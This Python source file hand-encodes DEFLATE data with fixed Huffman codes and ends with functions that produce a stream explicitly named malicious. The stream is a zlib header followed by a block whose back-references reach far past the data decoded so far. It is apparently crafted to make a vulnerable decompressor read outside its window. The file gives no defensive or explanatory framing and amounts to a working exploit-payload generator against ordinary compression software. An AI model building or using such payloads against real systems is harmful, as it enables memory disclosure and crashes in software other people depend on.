import bitstring

def fixed_huffman_range(start_val, end_val, start_code, end_code):
    assert end_code - start_code == end_val - start_val
    d = {start_val + i : start_code + i for i in range(end_code - start_code + 1)}
    return d

def get_fixed_huffman_codes():
    d = {}

    d.update(fixed_huffman_range(0, 143, 0b110000, 0b10111111))
    assert len(d) == 144
    d.update(fixed_huffman_range(144, 255, 0b110010000, 0b111111111))
    d.update(fixed_huffman_range(256, 279, 0b0, 0b10111))
    d.update(fixed_huffman_range(280, 287, 0b11000000, 0b11000111))

    sym_to_code = d
    code_to_sym = {v: k for k, v in sym_to_code.items()}

    lengths = {}
    lengths.update({i: 8 for i in range(0, 144)})
    lengths.update({i: 9 for i in range(144, 256)})
    lengths.update({i: 7 for i in range(256, 280)})
    lengths.update({i: 8 for i in range(280, 288)})

    assert 0b10111111 == sym_to_code[143]
    assert 8 == lengths[143]
    assert 143 == code_to_sym[0b10111111]

    assert 511 == sym_to_code[255]
    assert 9 == lengths[255]
    assert 255 == code_to_sym[511]

    assert 0 == sym_to_code[256]
    assert 7 == lengths[256]
    assert 256 == code_to_sym[0]
    
    return sym_to_code, code_to_sym, lengths

def encode_as_bits(num_bits, value):
    assert value & ((1 << num_bits) - 1) == value
    return ('{:0' + str(num_bits) + 'b}').format(value)

def encode_symbol(enc, symbol):
    return encode_as_bits(enc['lengths'][symbol], enc['sym_to_code'][symbol])

def encode_literal(enc, v):
    assert 0 <= v < 256
    return encode_as_bits(enc['lengths'][v], enc['sym_to_code'][v])

def create_length_encoding_data():
    d = []
    # code, extra_bits, min
    d += [(257 + i, 0, 3  +i) for i in range(8)]
    d += [(265 + i, 1, 11 +i*2) for i in range(4)]
    d += [(269 + i, 2, 19 +i*4) for i in range(4)]
    d += [(273 + i, 3, 35 +i*8) for i in range(4)]
    d += [(277 + i, 4, 67 +i*16) for i in range(4)]
    d += [(281 + i, 5, 131+i*32) for i in range(4)]
    d += [(285, 0, 258)]
    return d

def create_distance_encoding_data():
    d = []
    # code, extra_bits, min
    d += [(0,   0, 1)]
    d += [(1,   0, 2)]
    d += [(2,   0,  3)]
    d += [(3,   0,  4)]
    d += [(4,   1,  5)]
    d += [(5,   1,  7)]
    d += [(6,   2,  9)]
    d += [(7,   2,  13)]
    d += [(8,   3,  17)]
    d += [(9,   3,  25)]
    d += [(10,  4,  33)]
    d += [(11,  4,  49)]
    d += [(12,  5,  65)]
    d += [(13,  5,  97)]
    d += [(14,  6,  129)]
    d += [(15,  6,  193)]
    d += [(16,  7,  257)]
    d += [(17,  7,  385)]
    d += [(18,  8,  513)]
    d += [(19,  8,  769)]
    d += [(20,  9,  1025)]
    d += [(21,  9,  1537)]
    d += [(22,  10, 2049)]
    d += [(23,  10, 3073)]
    d += [(24,  11, 4097)]
    d += [(25,  11, 6145)]
    d += [(26,  12, 8193)]
    d += [(27,  12, 12289)]
    d += [(28,  13, 16385)]
    d += [(29,  13, 24577)]
    for i in range(len(d) - 1):
        assert d[i+1][2] == d[i][2] + (1 << d[i][1])
    return d

length_extra_bits_encoding = create_length_encoding_data()
distance_extra_bits_encoding = create_distance_encoding_data()

def encode_extra_bits_encoding(huff_enc, extra_bits_encoding, v):
    d = extra_bits_encoding

    assert v >= d[0][2] # check that it's a least minimum length

    for i in range(1, len(d)):
        code, extra_bits, value_start = d[i-1]
        if v < d[i][2]:
            break

    extra_val = v - value_start
    return encode_symbol(huff_enc, code) + ''.join(reversed(encode_as_bits(extra_bits, extra_val)))


def encode_length(huff_enc, v):
    assert 3 <= v <= 258
    return encode_extra_bits_encoding(huff_enc, length_extra_bits_encoding, v)


def encode_distance(huff_enc, v):
    assert 1 <= v <= 32768
    d = distance_extra_bits_encoding

    assert v >= d[0][2]  # check that it's a least minimum length

    code, extra_bits, value_start = None, None, None # just to get rid of the stupid warnings
    for i in range(1, len(d)):
        code, extra_bits, value_start = d[i - 1]
        if v < d[i][2]:
            break

    extra_val = v - value_start
    return encode_as_bits(5,  code) + ''.join(reversed(encode_as_bits(extra_bits, extra_val)))


def make_back_reference(huff_enc, length, backwards_distance):
    return encode_length(huff_enc, length) + encode_distance(huff_enc, backwards_distance)

HUFFMAN = {'fixed': dict(zip(('sym_to_code', 'code_to_sym', 'lengths'), get_fixed_huffman_codes()))}
assert encode_literal(HUFFMAN['fixed'], 143) == '10111111'


def make_zlib_header():
    return b'\x78\xda'

BLOCK_TYPE_NO_COMPRESSION = 0
BLOCK_TYPE_FIXED_HUFFMAN = 1
BLOCK_TYPE_DYNAMIC_HUFFMAN = 2
BLOCK_TYPE_ERROR = 3

SYMBOL_END_OF_BLOCK = 256

def encode_malicious_compressed_block():
    enc = HUFFMAN['fixed']
    b = '1'     # is_final yes
    b += '10'   # fixed huffman encoding

    offset = 256 + 280 * 0
    for i in range(16):
        #b += encode_literal(enc, 0x00) + encode_literal(enc, 41) * 279

        b += encode_literal(enc, 0x00) + make_back_reference(enc, 256, offset + 280 * 2 * (15-i)) + encode_literal(enc, 0) * 23

    b += encode_symbol(HUFFMAN['fixed'], SYMBOL_END_OF_BLOCK)
    b = b.ljust((len(b) + 7) & ~7, '0')
    assert len(b) % 8 == 0
    bs = ''.join(c for i in range(0, len(b), 8) for c in reversed(b[i:i+8]))
    return bitstring.Bits(bin=bs).tobytes()


def make_malicious_zlib_content():
    return make_zlib_header() + encode_malicious_compressed_block()

